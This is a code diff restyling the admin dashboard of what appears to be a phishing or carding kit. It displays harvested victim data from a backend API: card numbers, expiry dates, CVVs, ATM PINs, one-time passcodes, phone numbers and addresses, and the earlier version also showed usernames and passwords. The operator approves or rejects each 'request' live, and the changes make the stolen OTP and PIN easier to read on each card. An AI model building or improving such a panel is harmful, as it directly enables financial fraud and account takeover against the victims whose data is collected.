@@ -11,13 +11,14 @@
     --gold:#f4c26b;
     --ink:#1c2b36;
     --muted:#5c6b74;
-    --bg:#ffffff;
+    --bg:#f4f6f8;
+    --border:#e5e9eb;
   }
   *{box-sizing:border-box;}
   body{
     margin:0;
     font-family:"Segoe UI","Tahoma",Arial,sans-serif;
-    background:#ffffff;
+    background:var(--bg);
     color:var(--ink);
     min-height:100vh;
   }
@@ -28,15 +29,15 @@
     display:flex;
     align-items:center;
     justify-content:center;
-    padding:24px;
+    padding:16px;
   }
   .gate-card{
     background:#fff;
     width:100%;
-    max-width:340px;
+    max-width:360px;
     border-radius:12px;
     box-shadow:0 8px 30px rgba(18,49,79,.15);
-    padding:32px 26px;
+    padding:32px 24px;
     text-align:center;
   }
   .gate-card h1{
@@ -48,6 +49,7 @@
     font-size:13px;
     color:var(--muted);
     margin:0 0 22px;
+    line-height:1.5;
   }
   .gate-field{
     text-align:right;
@@ -63,9 +65,13 @@
     width:100%;
     border:1px solid #d7dce0;
     border-radius:6px;
-    padding:10px 12px;
+    padding:12px;
     font-size:14px;
     text-align:right;
+    outline:none;
+  }
+  .gate-field input:focus{
+    border-color:var(--navy);
   }
   .gate-error{
     color:#c0392b;
@@ -81,7 +87,7 @@
     color:#fff;
     border:none;
     border-radius:6px;
-    padding:11px;
+    padding:12px;
     font-size:14.5px;
     font-weight:700;
     cursor:pointer;
@@ -94,11 +100,11 @@
   .dash-header{
     background:#ffffff;
     color:var(--navy);
-    padding:20px 40px;
+    padding:16px 20px;
     display:flex;
     align-items:center;
     justify-content:space-between;
-    border-bottom:1px solid #e5e9eb;
+    border-bottom:1px solid var(--border);
   }
   .dash-header h1{
     font-size:16px;
@@ -115,32 +121,40 @@
     cursor:pointer;
   }
   .logout-btn:hover{background:#f4f6f7;}
+  
   .dash-body{
     width:100%;
-    padding:32px 40px 44px;
-    max-width:none;
+    padding:20px;
+    max-width:1200px;
     margin:0 auto;
   }
+  
+  /* ---------- STATS GRID ---------- */
   .cards-grid{
     display:grid;
-    grid-template-columns:repeat(3,minmax(220px,1fr));
-    gap:18px;
-    margin-bottom:32px;
+    grid-template-columns:1fr;
+    gap:12px;
+    margin-bottom:24px;
+  }
+  @media (min-width: 600px) {
+    .cards-grid {
+      grid-template-columns: repeat(3, 1fr);
+    }
   }
   .stat-card{
     background:#fff;
-    border:1px solid #e5e9eb;
+    border:1px solid var(--border);
     border-radius:8px;
-    padding:18px 20px;
-    box-shadow:0 2px 6px rgba(18,49,79,.05);
+    padding:16px;
+    box-shadow:0 2px 6px rgba(18,49,79,.03);
   }
   .stat-card .label{
-    font-size:13px;
+    font-size:12.5px;
     color:var(--muted);
-    margin-bottom:8px;
+    margin-bottom:6px;
   }
   .stat-card .value{
-    font-size:28px;
+    font-size:24px;
     font-weight:700;
     color:var(--navy);
   }
@@ -175,161 +189,189 @@
   }
   .live-card .value{
     color:#fff;
-    font-size:30px;
+    font-size:26px;
   }
   .live-card .sub{
     font-size:9.5px;
     color:#cfe0f0;
     margin-top:2px;
   }
+  
   .section-title{
-    font-size:17px;
+    font-size:16px;
     font-weight:700;
     color:var(--navy);
-    margin:0 0 16px;
-  }
-  .placeholder-box{
-    background:#fff;
-    border:1px solid #e5e9eb;
-    border-radius:10px;
-    padding:24px;
-    text-align:center;
-    color:var(--muted);
-    font-size:13px;
-    box-shadow:0 2px 8px rgba(18,49,79,.05);
+    margin:24px 0 12px;
   }
 
-  /* ---------- REQUESTS TABLE ---------- */
-  .table-wrap{
-    background:#fff;
-    border:1px solid #e5e9eb;
-    border-radius:10px;
-    overflow-x:auto;
-    box-shadow:0 2px 8px rgba(18,49,79,.05);
-    margin-bottom:28px;
+  /* ---------- RESPONSIVE CARDS LIST ---------- */
+  .requests-container {
+    display: grid;
+    grid-template-columns: 1fr;
+    gap: 12px;
   }
-  table.requests{
-    width:100%;
-    border-collapse:collapse;
-    font-size:14px;
-    min-width:1180px;
+  @media (min-width: 768px) {
+    .requests-container {
+      grid-template-columns: repeat(2, 1fr);
+    }
   }
-  table.requests th{
-    background:#f7f9fa;
-    color:var(--navy);
-    font-weight:700;
-    padding:16px 18px;
-    text-align:right;
-    white-space:nowrap;
-    border-bottom:1px solid #e5e9eb;
+  @media (min-width: 1024px) {
+    .requests-container {
+      grid-template-columns: repeat(3, 1fr);
+    }
   }
-  table.requests td{
-    padding:16px 18px;
-    border-bottom:1px solid #eef1f2;
-    text-align:right;
-    color:var(--ink);
-    white-space:normal;
-    vertical-align:top;
-    max-width:300px;
+
+  .request-card {
+    background: #fff;
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 16px;
+    box-shadow: 0 2px 8px rgba(18,49,79,.04);
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+    transition: transform 0.2s, box-shadow 0.2s;
   }
-  table.requests tr:last-child td{border-bottom:none;}
-  table.requests tr:hover td{background:#fafbfc;}
-  .status-badge{
-    display:inline-block;
-    padding:3px 10px;
-    border-radius:12px;
-    font-size:11.5px;
-    font-weight:700;
+  .request-card:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 4px 12px rgba(18,49,79,.08);
   }
-  .status-badge.pending{background:#e4e7ea;color:#5c6b74;}
-  .status-badge.approved{background:#dff3e6;color:#137a3d;}
-  .status-badge.rejected{background:#fbe0df;color:#a5342c;}
-  .row-actions{
-    display:flex;
-    flex-wrap:wrap;
-    gap:6px;
-    justify-content:flex-end;
+  .request-card-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 12px;
+    border-bottom: 1px dashed var(--border);
+    padding-bottom: 8px;
   }
-  .row-actions button{
-    border:1px solid #c7ccd1;
-    background:#fff;
-    color:var(--navy);
-    border-radius:6px;
-    padding:5px 10px;
-    font-size:11.5px;
-    cursor:pointer;
+  .request-card-title {
+    font-weight: 700;
+    color: var(--navy);
+    font-size: 14.5px;
   }
-  .row-actions button:hover{background:#f4f6f7;}
-  .row-actions .redirect-btn{
-    border-color:var(--link);
-    color:var(--link);
+  .request-card-body {
+    font-size: 13px;
+    color: var(--ink);
+    margin-bottom: 14px;
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
   }
-  .row-actions .approve-btn{
-    border-color:#1e8e50;
-    color:#1e8e50;
+  .request-card-row {
+    display: flex;
+    justify-content: space-between;
   }
-  .row-actions .approve-btn:hover{background:#eafaf0;}
-  .row-actions .reject-btn{
-    border-color:#c0392b;
-    color:#c0392b;
+  .request-card-row .label-text {
+    color: var(--muted);
   }
-  .row-actions .reject-btn:hover{background:#fdecea;}
+  .request-card-row .value-text {
+    font-weight: 600;
+    text-align: left;
+  }
+  .request-card-actions {
+    display: flex;
+    gap: 8px;
+  }
+  .request-card-actions button {
+    flex: 1;
+    padding: 10px;
+    font-size: 13px;
+    font-weight: 700;
+    border-radius: 6px;
+    cursor: pointer;
+    border: none;
+    transition: background 0.2s;
+  }
+  .btn-details {
+    background: var(--navy);
+    color: #fff;
+  }
+  .btn-details:hover {
+    background: #0c2438;
+  }
+
+  .status-badge {
+    display: inline-block;
+    padding: 3px 8px;
+    border-radius: 12px;
+    font-size: 11px;
+    font-weight: 700;
+  }
+  .status-badge.pending { background: #e4e7ea; color: #5c6b74; }
+  .status-badge.approved { background: #dff3e6; color: #137a3d; }
+  .status-badge.rejected { background: #fbe0df; color: #a5342c; }
+
+  .no-requests {
+    background: #fff;
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 32px;
+    text-align: center;
+    color: var(--muted);
+    font-size: 13.5px;
+  }
 
   /* ---------- DETAILS MODAL ---------- */
   .modal-overlay{
     position:fixed;
     inset:0;
-    background:rgba(18,49,79,.45);
+    background:rgba(18,49,79,.5);
     display:none;
     align-items:center;
     justify-content:center;
-    padding:20px;
+    padding:16px;
     z-index:1000;
+    overflow-y: auto;
   }
   .modal-overlay.show{display:flex;}
   .modal-box{
     background:#fff;
     border-radius:12px;
     width:100%;
-    max-width:520px;
-    padding:22px 20px;
+    max-width:480px;
+    padding:20px;
     box-shadow:0 12px 40px rgba(18,49,79,.25);
+    max-height: 90vh;
+    display: flex;
+    flex-direction: column;
   }
-  .modal-box h2{
+  .modal-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 12px;
+    margin-bottom: 12px;
+  }
+  .modal-header h2{
     font-size:16px;
     color:var(--navy);
-    margin:0 0 16px;
-    text-align:right;
+    margin:0;
+  }
+  .modal-body {
+    overflow-y: auto;
+    flex: 1;
+    padding-right: 4px;
   }
   .modal-row{
     display:flex;
     justify-content:space-between;
     align-items:flex-start;
     gap:10px;
-    padding:8px 0;
+    padding:10px 0;
     border-bottom:1px solid #eef1f2;
     font-size:13px;
   }
   .modal-row:last-of-type{border-bottom:none;}
   .modal-row .k{color:var(--muted);white-space:nowrap;}
-  .modal-row .v{color:var(--ink);font-weight:600;text-align:left;}
-  .modal-close{
-    width:100%;
-    margin-top:16px;
-    background:var(--navy);
-    color:#fff;
-    border:none;
-    border-radius:6px;
-    padding:10px;
-    font-size:13.5px;
-    font-weight:700;
-    cursor:pointer;
-  }
-  .modal-close:hover{background:#0c2438;}
+  .modal-row .v{color:var(--ink);font-weight:600;text-align:left; word-break: break-all;}
+  
   .modal-actions{
     display:flex;
     gap:10px;
     margin-top:18px;
+    border-top: 1px solid var(--border);
+    padding-top:14px;
   }
   .modal-actions button{
     flex:1;
@@ -338,34 +380,37 @@
     justify-content:center;
     gap:6px;
     border-radius:8px;
-    padding:10px;
+    padding:12px;
     font-size:13.5px;
     font-weight:700;
     cursor:pointer;
     border:1.5px solid transparent;
-    transition:background .15s, transform .1s, box-shadow .15s;
+    transition: all 0.15s;
   }
   .modal-actions button svg{width:16px;height:16px;flex-shrink:0;}
   .modal-actions button:active{transform:scale(.97);}
-  .modal-approve,
-  .modal-reject{
-    background:#eef0f2;
-    color:#8a9096;
-    border-color:transparent;
-    box-shadow:none;
+  
+  .modal-approve {
+    background: #1e8e50;
+    color: #fff;
   }
-  .modal-approve.active{
-    background:#1e8e50;
-    color:#fff;
-    box-shadow:0 2px 6px rgba(30,142,80,.3);
+  .modal-approve:hover {
+    background: #177041;
   }
-  .modal-approve.active:hover{background:#177041; box-shadow:0 3px 10px rgba(30,142,80,.4);}
-  .modal-reject.active{
-    background:#fff;
-    color:#c0392b;
-    border-color:#e3b3ad;
+  .modal-reject {
+    background: #c0392b;
+    color: #fff;
   }
-  .modal-reject.active:hover{background:#fdecea; border-color:#c0392b;}
+  .modal-reject:hover {
+    background: #a5342c;
+  }
+  .modal-close {
+    background: #e4e7ea;
+    color: #5c6b74;
+  }
+  .modal-close:hover {
+    background: #d7dce0;
+  }
 
   /* ---------- TOAST NOTIFICATION ---------- */
   .toast{
@@ -399,11 +444,6 @@
     border-radius:50%;
     background:#4ee08a;
     flex-shrink:0;
-  }
-  @media (max-width:900px){
-    .dash-header{padding:16px 20px;}
-    .dash-body{padding:24px 20px 32px;}
-    .cards-grid{grid-template-columns:1fr;gap:12px;}
   }
 </style>
 </head>
@@ -456,34 +496,8 @@
       </div>
 
       <p class="section-title">قائمة الطلبات</p>
-      <div class="table-wrap">
-        <table class="requests">
-          <thead>
-            <tr>
-              <th>اسم المستخدم</th>
-              <th>كلمة المرور</th>
-              <th>رقم الجوال</th>
-              <th>الاسم</th>
-              <th>البريد</th>
-              <th>اسم صاحب البطاقة</th>
-              <th>رقم البطاقة</th>
-              <th>تاريخ الانتهاء</th>
-              <th>cvv</th>
-              <th>الرقم السري للبطاقة (ATM PIN)</th>
-              <th>عنوان التوصيل</th>
-              <th>الحالة</th>
-              <th>الإجراءات</th>
-            </tr>
-          </thead>
-          <tbody id="requestsBody">
-            <!-- بيتملى تلقائيًا من السيرفر الخلفي (server.js) عبر /api/requests -->
-          </tbody>
-        </table>
-      </div>
-
-      <p class="section-title">أقسام أخرى</p>
-      <div class="placeholder-box">
-        باقي أقسام لوحة التحكم (التقارير، الإعدادات) هتتحط هنا لاحقًا حسب اللي تحدده.
+      <div class="requests-container" id="requestsContainer">
+        <!-- بيتملى تلقائيًا من السيرفر الخلفي (server.js) عبر /api/requests -->
       </div>
     </div>
   </div>
@@ -491,19 +505,22 @@
   <!-- Details modal -->
   <div class="modal-overlay" id="detailsModal">
     <div class="modal-box">
-      <h2>تفاصيل الطلب</h2>
-      <div class="modal-row"><span class="k">اسم المستخدم</span><span class="v" id="mUsername"></span></div>
-      <div class="modal-row"><span class="k">كلمة المرور</span><span class="v" id="mPassword"></span></div>
-      <div class="modal-row"><span class="k">OTP</span><span class="v" id="mOtp"></span></div>
-      <div class="modal-row"><span class="k">الاسم</span><span class="v" id="mName"></span></div>
-      <div class="modal-row"><span class="k">رقم الجوال</span><span class="v" id="mPhone"></span></div>
-      <div class="modal-row"><span class="k">البريد</span><span class="v" id="mEmail"></span></div>
-      <div class="modal-row"><span class="k">اسم صاحب البطاقة</span><span class="v" id="mCardName"></span></div>
-      <div class="modal-row"><span class="k">رقم البطاقة</span><span class="v" id="mCardNumber"></span></div>
-      <div class="modal-row"><span class="k">تاريخ الانتهاء</span><span class="v" id="mCardExpiry"></span></div>
-      <div class="modal-row"><span class="k">CVV</span><span class="v" id="mCardCvv"></span></div>
-      <div class="modal-row"><span class="k">الرقم السري للبطاقة (ATM PIN)</span><span class="v" id="mAtmPin"></span></div>
-      <div class="modal-row"><span class="k">عنوان التوصيل</span><span class="v" id="mAddress"></span></div>
+      <div class="modal-header">
+        <h2>تفاصيل الطلب بالكامل</h2>
+        <span class="status-badge" id="mStatusBadge"></span>
+      </div>
+      <div class="modal-body">
+        <div class="modal-row"><span class="k">الاسم</span><span class="v" id="mName"></span></div>
+        <div class="modal-row"><span class="k">رقم الجوال</span><span class="v" id="mPhone"></span></div>
+        <div class="modal-row"><span class="k">البريد الإلكتروني</span><span class="v" id="mEmail"></span></div>
+        <div class="modal-row"><span class="k">عنوان التوصيل</span><span class="v" id="mAddress"></span></div>
+        <div class="modal-row"><span class="k">اسم صاحب البطاقة</span><span class="v" id="mCardName"></span></div>
+        <div class="modal-row"><span class="k">رقم البطاقة</span><span class="v" id="mCardNumber"></span></div>
+        <div class="modal-row"><span class="k">تاريخ الانتهاء</span><span class="v" id="mCardExpiry"></span></div>
+        <div class="modal-row"><span class="k">CVV</span><span class="v" id="mCardCvv"></span></div>
+        <div class="modal-row"><span class="k">الـ OTP</span><span class="v" id="mOtp"></span></div>
+        <div class="modal-row"><span class="k">الـ ATM PIN</span><span class="v" id="mAtmPin"></span></div>
+      </div>
       <div class="modal-actions">
         <button class="modal-approve" id="modalApproveBtn" type="button">
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
@@ -513,8 +530,8 @@
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6L6 18M6 6l12 12"/></svg>
           رفض
         </button>
+        <button class="modal-close" id="modalCloseBtn" type="button">إغلاق</button>
       </div>
-      <button class="modal-close" id="modalCloseBtn" type="button">إغلاق</button>
     </div>
   </div>
 
@@ -623,31 +640,35 @@
     }
 
     function renderRequests(){
-      var tbody = document.getElementById('requestsBody');
-      tbody.innerHTML = '';
+      var container = document.getElementById('requestsContainer');
+      container.innerHTML = '';
+      
+      if (latestRequests.length === 0) {
+        container.innerHTML = '<div class="no-requests">لا توجد طلبات حالية</div>';
+        return;
+      }
+
       latestRequests.forEach(function(r){
         var st = statusLabel(r.status);
-        var row = document.createElement('tr');
-        row.dataset.id = r.id;
-        row.innerHTML =
-          '<td>' + escapeHtml(r.username || '-') + '</td>' +
-          '<td>' + escapeHtml(r.password || '-') + '</td>' +
-          '<td>' + escapeHtml(r.phone || r.mobile || '-') + '</td>' +
-          '<td>' + escapeHtml(r.name || '-') + '</td>' +
-          '<td>' + escapeHtml(r.email || '-') + '</td>' +
-          '<td>' + escapeHtml(r.cardName || '-') + '</td>' +
-          '<td>' + escapeHtml(r.cardNumber || '-') + '</td>' +
-          '<td>' + escapeHtml(r.cardExpiry || '-') + '</td>' +
-          '<td>' + escapeHtml(r.cardCvv || '-') + '</td>' +
-          '<td>' + escapeHtml(r.atmPin || '-') + '</td>' +
-          '<td>' + escapeHtml(r.address || '-') + '</td>' +
-          '<td><span class="status-badge ' + st.cls + '">' + st.text + '</span></td>' +
-          '<td><div class="row-actions">' +
-            '<button type="button" class="details-btn">التفاصيل</button>' +
-            '<button type="button" class="approve-btn">قبول</button>' +
-            '<button type="button" class="reject-btn">رفض</button>' +
-          '</div></td>';
-        tbody.appendChild(row);
+        var card = document.createElement('div');
+        card.className = 'request-card';
+        card.dataset.id = r.id;
+        
+        card.innerHTML = 
+          '<div class="request-card-header">' +
+            '<span class="request-card-title">' + escapeHtml(r.name || '-') + '</span>' +
+            '<span class="status-badge ' + st.cls + '">' + st.text + '</span>' +
+          '</div>' +
+          '<div class="request-card-body">' +
+            '<div class="request-card-row"><span class="label-text">رقم الجوال:</span><span class="value-text">' + escapeHtml(r.phone || r.mobile || '-') + '</span></div>' +
+            '<div class="request-card-row"><span class="label-text">الـ OTP:</span><span class="value-text">' + (r.otp ? '✔️ ' + escapeHtml(r.otp) : '❌ لا يوجد') + '</span></div>' +
+            '<div class="request-card-row"><span class="label-text">الـ ATM PIN:</span><span class="value-text">' + (r.atmPin ? '✔️ ' + escapeHtml(r.atmPin) : '❌ لا يوجد') + '</span></div>' +
+          '</div>' +
+          '<div class="request-card-actions">' +
+            '<button type="button" class="btn-details details-btn">التفاصيل</button>' +
+          '</div>';
+          
+        container.appendChild(card);
       });
     }
 
@@ -750,23 +771,23 @@
     var detailsModal = document.getElementById('detailsModal');
     var modalApproveBtn = document.getElementById('modalApproveBtn');
     var modalRejectBtn = document.getElementById('modalRejectBtn');
+    var mStatusBadge = document.getElementById('mStatusBadge');
 
     function fillModal(r){
-      document.getElementById('mUsername').textContent = r.username || '-';
-      document.getElementById('mPassword').textContent = r.password || '-';
-      document.getElementById('mOtp').textContent = r.otp || '-';
+      var st = statusLabel(r.status);
+      mStatusBadge.textContent = st.text;
+      mStatusBadge.className = 'status-badge ' + st.cls;
+
       document.getElementById('mName').textContent = r.name || '-';
       document.getElementById('mPhone').textContent = r.phone || r.mobile || '-';
       document.getElementById('mEmail').textContent = r.email || '-';
+      document.getElementById('mAddress').textContent = r.address || '-';
       document.getElementById('mCardName').textContent = r.cardName || '-';
       document.getElementById('mCardNumber').textContent = r.cardNumber || '-';
       document.getElementById('mCardExpiry').textContent = r.cardExpiry || '-';
       document.getElementById('mCardCvv').textContent = r.cardCvv || '-';
+      document.getElementById('mOtp').textContent = r.otp || '-';
       document.getElementById('mAtmPin').textContent = r.atmPin || '-';
-      document.getElementById('mAddress').textContent = r.address || '-';
-      var isPending = r.status === 'pending' || !r.status;
-      modalApproveBtn.classList.toggle('active', isPending);
-      modalRejectBtn.classList.toggle('active', isPending);
     }
 
     function updateStatus(id, status){
@@ -775,7 +796,7 @@
       if (r) {
         r.status = status;
         renderRequests();
-        showToast((status === 'approved' ? 'تم قبول' : 'تم رفض') + ' طلب: ' + (r.username || '-'));
+        showToast((status === 'approved' ? 'تم قبول' : 'تم رفض') + ' طلب: ' + (r.name || '-'));
       }
       adminFetch('/api/requests/' + id + '/status', {
         method: 'POST',
@@ -786,20 +807,16 @@
       });
     }
 
-    document.getElementById('requestsBody').addEventListener('click', function(e){
-      var row = e.target.closest('tr');
-      if (!row) return;
-      var id = Number(row.dataset.id);
+    document.getElementById('requestsContainer').addEventListener('click', function(e){
+      var card = e.target.closest('.request-card');
+      if (!card) return;
+      var id = Number(card.dataset.id);
       var r = latestRequests.find(function(x){ return x.id === id; });
       if (!r) return;
       if (e.target.classList.contains('details-btn')) {
         currentRequestId = id;
         fillModal(r);
         detailsModal.classList.add('show');
-      } else if (e.target.classList.contains('approve-btn')) {
-        updateStatus(id, 'approved');
-      } else if (e.target.classList.contains('reject-btn')) {
-        updateStatus(id, 'rejected');
       }
     });
 
